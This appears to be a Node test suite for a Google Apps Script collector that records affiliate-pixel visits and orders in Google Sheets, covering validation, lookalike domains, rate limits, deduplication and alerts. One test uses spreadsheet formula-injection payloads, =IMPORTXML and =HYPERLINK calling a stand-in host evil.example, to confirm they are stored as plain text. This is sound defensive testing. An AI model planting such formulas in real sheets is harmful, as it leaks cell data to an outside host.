'use strict';
// collector/apps-script.gs run in a Node vm against small mocks of the Apps
// Script services it uses, fed with payloads built by the pixel's own code.
const test = require('node:test');
const assert = require('node:assert/strict');
const vm = require('node:vm');
const fs = require('fs');
const path = require('path');
const t = require('../src/lib/touch.js');
const { classify } = require('../src/lib/classify.js');
const { extractOrder } = require('../src/lib/extract-order.js');

const SOURCE = fs.readFileSync(path.join(__dirname, '..', 'collector', 'apps-script.gs'), 'utf8');
const NOW = Date.parse('2026-10-19T14:00:00.000Z');

// A leading apostrophe forces text in Google Sheets and is not part of the value.
const norm = (v) => (typeof v === 'string' && v.startsWith("'") ? v.slice(1) : v);

function makeSheet(writes) {
  const rows = [];
  const lastRow = () => {
    for (let i = rows.length - 1; i >= 0; i--) if (rows[i] && rows[i].some((v) => v !== '' && v != null)) return i + 1;
    return 0;
  };
  return {
    rows,
    appendRow: (r) => { writes.push(r); rows[lastRow()] = r.map(norm); },
    getLastRow: lastRow,
    setFrozenRows: () => {},
    getDataRange() { return this.getRange(1, 1, lastRow(), Math.max(1, ...rows.map((r) => (r ? r.length : 0)))); },
    getRange: (r, c, nr = 1, nc = 1) => ({
      getValues: () => Array.from({ length: nr }, (_, i) => Array.from({ length: nc }, (_, j) => {
        const v = (rows[r - 1 + i] || [])[c - 1 + j];
        return v === undefined ? '' : v;
      })),
      setValues: (v) => v.forEach((vr, i) => { writes.push(vr); rows[r - 1 + i] = vr.map(norm); }),
      clearContent: () => { for (let i = 0; i < nr; i++) rows[r - 1 + i] = []; },
    }),
  };
}

function load() {
  const sheets = {};
  const writes = [];
  const triggers = [];
  const cache = new Map();
  const props = new Map();
  let clock = NOW;
  const ss = {
    getSheetByName: (n) => sheets[n] || null,
    insertSheet: (n) => (sheets[n] = makeSheet(writes)),
    setSpreadsheetTimeZone: () => {},
  };
  const lock = { waitLock() {}, tryLock: () => true, releaseLock() {} };
  const ctx = vm.createContext({
    SpreadsheetApp: { getActiveSpreadsheet: () => ss },
    LockService: { getScriptLock: () => lock, getUserLock: () => lock },
    CacheService: { getScriptCache: () => ({ get: (k) => (cache.has(k) ? cache.get(k) : null), put: (k, v) => cache.set(k, v) }) },
    PropertiesService: { getScriptProperties: () => ({ getProperty: (k) => (props.has(k) ? props.get(k) : null), setProperty: (k, v) => props.set(k, v) }) },
    ScriptApp: {
      getProjectTriggers: () => triggers.slice(),
      deleteTrigger: (tr) => triggers.splice(triggers.indexOf(tr), 1),
      newTrigger: (fn) => ({ timeBased: () => ({ everyMinutes: (m) => ({ create: () => triggers.push({ fn, m, getHandlerFunction: () => fn }) }) }) }),
    },
    ContentService: { createTextOutput: (s) => ({ text: s }) },
    console,
    Date: class extends Date {
      constructor(...a) { if (a.length) super(...a); else super(clock); }
      static now() { return clock; }
    },
  });
  vm.runInContext(SOURCE, ctx);
  ctx.setup();
  sheets.aliados.appendRow(['Tienda A', 'https://www.tiendaa.com/']);
  sheets.aliados.appendRow(['Tienda B', 'tiendab.co']);
  const post = (body) => ctx.doPost({ postData: { contents: typeof body === 'string' ? body : JSON.stringify(body) } });
  const tab = (name) => {
    const [header, ...data] = sheets[name].rows.filter((r) => r && r.length);
    return data.map((r) => Object.fromEntries(header.map((h, i) => [h, r[i]])));
  };
  return { ctx, sheets, writes, triggers, post, tab, advance: (ms) => { clock += ms; } };
}

const cfg = { hsSources: ['hotsale'], referrerDomains: ['hotsale.com.co'], pixelVersion: '2.0.0' };
function visit(utmCampaign = 'hs26oct', landedMs = NOW - 3600000) {
  const hit = classify(`?utm_source=hotsale&utm_campaign=${utmCampaign}`, 'https://hotsale.com.co/', cfg);
  return t.buildTouch(hit, landedMs, 'www.tiendaa.com');
}
const touchOf = (touch, domain = 'www.tiendaa.com') => t.touchPayload(touch, domain, NOW, cfg);
const orderOf = (touch, dataLayer, domain = 'www.tiendaa.com') => t.purchasePayload(touch, extractOrder(dataLayer), domain, NOW, false, cfg);
const ga4 = (id, value, currency = 'COP') => [{ event: 'purchase', ecommerce: { transaction_id: id, value, currency } }];

test('setup creates every tab and one 10-minute trigger (idempotent)', () => {
  const { ctx, sheets, triggers } = load();
  ctx.setup();
  assert.deepEqual(Object.keys(sheets).sort(), ['aliados', 'eventos', 'pedidos', 'rechazados', 'toques']);
  assert.deepEqual(triggers.map((x) => [x.fn, x.m]), [['procesar', 10]]);
});

test('a visit and its order: logged in eventos, then one row each in toques and pedidos', () => {
  const { ctx, post, tab } = load();
  const v = visit();
  assert.equal(post(touchOf(v)).text, 'ok');
  assert.equal(ctx.doGet().text, 'ok');
  post(orderOf(v, ga4('00123', 250000)));
  assert.equal(tab('eventos').length, 2);
  assert.equal(tab('eventos')[0].aliado, 'Tienda A');
  ctx.procesar();
  assert.equal(tab('toques').length, 1);
  const [order] = tab('pedidos');
  assert.equal(order.order_id, '00123', 'kept as text, leading zeros intact');
  assert.equal(order.order_value, 250000);
  assert.equal(order.order_status, 'complete');
  assert.equal(order.alerta, '');
  assert.equal(tab('rechazados').length, 0);
});

test('rejected: garbage, v1 payloads, unknown or lookalike domains, bad fields', () => {
  const { post, tab } = load();
  const good = touchOf(visit());
  const cases = [
    ['{not json', 'JSON inválido'],
    [{ store_domain: 'www.tiendaa.com', utm_source: 'hotsale', order_id: 'unknown', order_value: 0 }, 'v distinto de 2'],
    [{ ...good, pixel_version: '1.0.0' }, 'versión del píxel no soportada'],
    [{ ...good, event: 'click' }, 'event inválido'],
    [{ ...good, signal: 'keyword' }, 'signal inválido'],
    [{ ...good, is_test: 'no' }, 'is_test inválido'],
    [{ ...good, landed_at: 'ayer' }, 'landed_at inválido'],
    [{ ...good, landed_at: new Date(NOW - 40 * 86400000).toISOString() }, 'landed_at fuera de rango'],
    [{ ...good, landed_at: new Date(NOW + 2 * 86400000).toISOString() }, 'landed_at fuera de rango'],
    [{ ...good, utm_campaign: 5 }, 'utm_campaign inválido'],
    [{ ...good, store_domain: 'evil.com' }, 'dominio no registrado: evil.com'],
    [{ ...good, store_domain: 'tiendaa.com.evil.com' }, 'dominio no registrado: tiendaa.com.evil.com'],
    [{ ...good, store_domain: 'evil-tiendaa.com' }, 'dominio no registrado: evil-tiendaa.com'],
    [{ ...orderOf(visit(), ga4('X', 1)), order_value: '250000' }, 'order_value inválido'],
    [{ ...orderOf(visit(), ga4('X', 1)), order_status: 'paid' }, 'order_status inválido'],
    [{ ...orderOf(visit(), ga4('X', 1)), currency: 'pesos' }, 'currency inválida'],
    ['x'.repeat(9000), 'cuerpo de más de 8 KB'],
  ];
  for (const [body] of cases) post(body);
  assert.equal(tab('eventos').length, 0);
  assert.deepEqual(tab('rechazados').map((r) => r.motivo), cases.map((c) => c[1]));
});

test('the store domain may be the registered one, www or any subdomain', () => {
  const { post, tab } = load();
  const v = visit();
  for (const d of ['tiendaa.com', 'www.tiendaa.com', 'checkout.tiendaa.com', 'TIENDAB.CO']) post(touchOf(v, d));
  assert.deepEqual(tab('eventos').map((r) => r.aliado), ['Tienda A', 'Tienda A', 'Tienda A', 'Tienda B']);
});

test('rate limit per store, and a cap on logged rejections', () => {
  const { post, tab, advance } = load();
  for (let i = 0; i < 125; i++) post(touchOf(visit('c' + i)));
  assert.equal(tab('eventos').length, 120);
  assert.equal(tab('rechazados').length, 5);
  assert.match(tab('rechazados')[0].motivo, /más de 120 envíos por minuto de tiendaa\.com/);
  advance(60000);
  post(touchOf(visit('next-minute')));
  assert.equal(tab('eventos').length, 121, 'the limit resets every minute');
  for (let i = 0; i < 100; i++) post('garbage');
  assert.equal(tab('rechazados').length, 5 + 30, 'at most 30 rejections logged in the new minute');
});

test('pedidos: one row per order; complete replaces incomplete, within a run and across runs', () => {
  const { ctx, post, tab } = load();
  const v = visit();
  post(touchOf(v));
  post(orderOf(v, ga4('T1', '250.000')));
  post(orderOf(v, ga4('T1', '250.000')));
  ctx.procesar();
  assert.equal(tab('pedidos').length, 1);
  assert.equal(tab('pedidos')[0].order_status, 'incomplete');
  post(orderOf(v, ga4('T1', 250000)));
  post(orderOf(v, ga4('T1', '250.000')));
  ctx.procesar();
  assert.equal(tab('pedidos').length, 1);
  assert.equal(tab('pedidos')[0].order_status, 'complete');
  assert.equal(tab('pedidos')[0].order_value, 250000);
  assert.equal(tab('eventos').length, 5, 'the raw log keeps everything');
});

test('alerts: no recorded arrival, arrival used by another order, high value', () => {
  const { ctx, post, tab } = load();
  const a = visit('a');
  const b = visit('b');
  post(orderOf(a, ga4('NO-TOUCH', 1000)));
  post(touchOf(b));
  post(orderOf(b, ga4('FIRST', 1000)));
  post(orderOf(b, ga4('SECOND', 1000)));
  post(orderOf(b, ga4('BIG', 99000000)));
  post(orderOf(b, ga4('BIG-USD', 6000, 'USD')));
  ctx.procesar();
  assert.deepEqual(tab('pedidos').map((r) => [r.order_id, r.alerta]), [
    ['NO-TOUCH', 'sin llegada registrada'],
    ['FIRST', ''],
    ['SECOND', 'llegada ya usada por otro pedido'],
    ['BIG', 'llegada ya usada por otro pedido, valor alto'],
    ['BIG-USD', 'llegada ya usada por otro pedido, valor alto'],
  ]);
});

test('duplicate arrivals collapse; orders without id are all kept', () => {
  const { ctx, post, tab } = load();
  const v = visit();
  post(touchOf(v));
  post(touchOf(v));
  post(orderOf(v, []));
  post(orderOf(v, []));
  ctx.procesar();
  ctx.procesar();
  assert.equal(tab('toques').length, 1);
  assert.equal(tab('pedidos').length, 2);
});

test('text from URLs can never become a formula, including when procesar copies it', () => {
  const { ctx, post, writes } = load();
  const v = { ...visit(), utm_campaign: '=IMPORTXML("https://evil.example/?"&A1,"//a")', utm_term: '+1', utm_content: '@x' };
  post(touchOf(v));
  post(orderOf(v, ga4('=HYPERLINK("https://evil.example")', 1000)));
  writes.length = 0;
  ctx.procesar();
  assert.ok(writes.length > 0);
  for (const row of writes) {
    for (const cell of row) {
      if (typeof cell === 'string' && cell !== '') assert.ok(cell.startsWith("'"), `not forced to text: ${cell}`);
    }
  }
});

test('reprocesar rebuilds the same toques and pedidos from the raw log', () => {
  const { ctx, post, tab } = load();
  const v = visit();
  post(touchOf(v));
  post(orderOf(v, ga4('T1', '250.000')));
  post(orderOf(v, ga4('T1', 250000)));
  post(orderOf(v, ga4('T2', 1000)));
  ctx.procesar();
  const before = JSON.stringify([tab('toques'), tab('pedidos')]);
  ctx.reprocesar();
  assert.equal(JSON.stringify([tab('toques'), tab('pedidos')]), before);
});
